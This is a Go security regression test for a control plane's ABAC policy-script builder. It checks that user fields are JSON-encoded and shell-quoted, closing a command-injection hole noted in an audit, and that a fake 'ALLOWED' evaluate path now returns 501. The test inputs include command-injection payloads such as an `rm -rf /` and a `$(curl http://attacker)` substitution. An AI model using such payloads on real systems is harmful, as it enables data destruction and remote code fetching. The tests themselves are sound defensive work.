package controlplane

// abac_ops_security_test.go — A1 审计 BA-04 的变异反证。
//
// 旧实现把用户字段原样拼进 `echo '{"subject":%s,...}'`：请求体带 ' 即闭合单引号注入命令；
// evaluate 则把 "Result: ALLOWED" 硬编码进 echo——不查任何引擎、任何输入都"允许"。
// 本文件钉住两件事：
//  1. policy-create 的脚本是「JSON 编码 → shell 单引号字面量」的精确形状（全等断言），
//     且该字面量经真 shell 求值后逐字节还原为 JSON 文档（注入层不存在）；
//  2. evaluate 一律 501（不再产出假判定），缺字段 400、未知 action 400。
//
// 真 shell 对拍的形状沿用 pkg/shellquote/quote_test.go 的先例（argv 数组 + 探针，
// Windows 上找 git-bash/WSL，找不到才跳过），注入语义必须交给 sh -c 验。
import (
	"encoding/json"
	"os"
	"os/exec"
	"strings"
	"testing"
)

// abacShellProbe 本机可用的 POSIX shell 启动命令（nil=无）。
var abacShellProbe = func() []string {
	if _, err := exec.LookPath("sh"); err == nil {
		return []string{"sh", "-c"}
	}
	for _, cand := range []string{
		`C:\Program Files\Git\bin\bash.exe`,
		`C:\Program Files\Git\usr\bin\bash.exe`,
		`C:\Program Files (x86)\Git\bin\bash.exe`,
	} {
		if _, err := os.Stat(cand); err == nil {
			return []string{cand, "-c"}
		}
	}
	if _, err := exec.LookPath("wsl"); err == nil {
		return []string{"wsl", "sh", "-c"}
	}
	return nil
}()

// abacShellEval 让真实 shell 求值给定脚本体（argv 数组传参，不走 shell 拼接执行路径）。
func abacShellEval(t *testing.T, script string) string {
	t.Helper()
	if abacShellProbe == nil {
		t.Skip("no POSIX shell available on this host")
	}
	out, err := exec.Command(abacShellProbe[0], append(abacShellProbe[1:], script)...).CombinedOutput()
	if err != nil {
		t.Fatalf("shell 求值失败: %v (%s)", err, out)
	}
	return string(out)
}

func TestBuildABACScript_PolicyCreateQuotesPayload(t *testing.T) {
	// 三层载荷：单引号闭合、双引号+命令替换、反引号——旧实现任一都能逃逸
	subject := `x'; rm -rf / #`
	resource := `r"; $(curl http://attacker) `
	actionAttr := "delete-all"
	context := "ctx' && echo pwned"

	script, status, errMsg := buildABACScript("policy-create", subject, resource, actionAttr, context)
	if errMsg != "" || status != 0 {
		t.Fatalf("policy-create 应可下发，得到 status=%d err=%q", status, errMsg)
	}

	doc, err := json.Marshal(map[string]string{
		"subject": subject, "resource": resource, "action": actionAttr, "context": context,
	})
	if err != nil {
		t.Fatalf("json.Marshal: %v", err)
	}
	want := `mkdir -p /etc/opsmesh/abac && echo ` + shellQuote(string(doc)) +
		` >> /etc/opsmesh/abac/policies.json && echo "ABAC policy created"`
	if script != want {
		t.Fatalf("脚本形状不是「JSON→shell 字面量」的精确形状：\n got: %s\nwant: %s", script, want)
	}
	// 真 shell 求值：echo 参数逐字节还原为 JSON 文档——"注入层不存在"的直接证据
	evaluated := abacShellEval(t, "printf '%s' "+shellQuote(string(doc)))
	if evaluated != string(doc) {
		t.Fatalf("shell 求值后不等于原文档：\n got: %q\nwant: %q", evaluated, doc)
	}
}

func TestBuildABACScript_EvaluateIsExplicit501(t *testing.T) {
	script, status, errMsg := buildABACScript("evaluate", "s", "r", "a", "")
	if status != 501 {
		t.Fatalf("evaluate 应显式 501（不再假 ALLOWED），得到 status=%d script=%q", status, script)
	}
	if script != "" {
		t.Fatalf("evaluate 不得再产出任何下发脚本，得到 %q", script)
	}
	if !strings.Contains(errMsg, "not implemented") {
		t.Fatalf("501 消息应说明未实现与 RBAC 口径，得到 %q", errMsg)
	}
}

func TestBuildABACScript_Rejections(t *testing.T) {
	if _, status, errMsg := buildABACScript("policy-create", "", "r", "a", ""); status != 400 {
		t.Fatalf("缺 subject 应 400，得到 %d %q", status, errMsg)
	}
	if _, status, errMsg := buildABACScript("no-such-action", "", "", "", ""); status != 400 {
		t.Fatalf("未知 action 应 400，得到 %d %q", status, errMsg)
	}
	if _, status, _ := buildABACScript("policy-list", "", "", "", ""); status != 0 {
		t.Fatalf("policy-list 无需字段，应可下发")
	}
}
